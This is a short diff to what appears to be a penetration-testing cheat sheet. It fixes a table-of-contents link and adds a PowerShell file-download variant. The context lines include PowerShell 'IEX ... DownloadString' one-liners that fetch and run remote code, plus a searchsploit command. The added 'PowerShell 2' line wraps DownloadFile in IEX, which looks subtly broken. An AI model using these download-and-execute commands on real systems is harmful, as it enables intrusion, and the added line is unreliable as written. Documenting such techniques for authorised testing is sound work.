@@ -4,7 +4,7 @@
  
     - [Downloading Files (Curl / Wget)](#downloading--uploading-files-curl--wget)
 
-    - [Download Files with PowerShell](#upload--download-files-with-netcat)
+    - [Download Files with PowerShell](#download-files-with-powershell)
 
     - [Upload / Download Files with Netcat](#upload--download-files-with-netcat)
 
@@ -147,6 +147,8 @@ Downloading Exploits From searchsploit <code>searchsploit -x [EXPLOIT_CODE] > [E
 <code>powershell Invoke-RestMethod -Uri '[URL]' -OutFile '[PATH\TO\FILE\]'</code>
 
 <code>powershell IEX(New-Object Net.WebClient).DownloadString('[URL]')</code>
+
+PowerShell 2: <code>powershell IEX((New-Object Net.WebClient).DownloadFile('[URL]', '[PATH\TO\FILE\]'))</code>
 
 ### Upload / Download Files with Netcat
 
